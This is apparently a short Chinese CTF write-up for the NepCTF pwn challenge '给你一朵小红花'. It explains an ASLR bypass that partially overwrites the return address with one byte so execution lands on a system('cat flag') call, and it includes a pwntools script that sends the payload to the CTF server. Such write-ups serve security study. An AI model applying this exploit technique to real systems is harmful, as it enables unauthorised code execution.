---
title: EIP
categories: 
    - Stack
    - EIP
---
# EIP
<!--more-->
## 地址随机化

### NepCTF 给你一朵小红花

2021.3.25

找字符串看见cat flag的system函数，进去发现反编译是红色的，快捷键P手动让IDA生成一个函数

![20210325191702](https://raw.githubusercontent.com/YTrick/image/branch/image/20210325191702.png)

![20210325191953](https://raw.githubusercontent.com/YTrick/image/branch/image/20210325191953.png)

只要程序返回到这个

![{9A808D7E-F8DA-C99D-776D-F86EB6839E53}](https://raw.githubusercontent.com/YTrick/image/branch/image/%7B9A808D7E-F8DA-C99D-776D-F86EB6839E53%7D.JPG)

也就是返回了序号5对应的字符
这个时候发送send不要line 下面的内容

![20210325192243](https://raw.githubusercontent.com/YTrick/image/branch/image/20210325192243.png)

`p64(0) + p64(1) + b"\xE1"`

```py
from pwn import * 
context.arch = 'amd64' 
context.log_level='debug'  
#p = process('./xhh') 
p = remote('node2.hackingfor.fun',35402 )
#p = remote('127.0.0.1',12345)  
payload = p64(0) + p64(1) + b"\xE1" 
p.send(payload)
```

多跑几次就能出flag






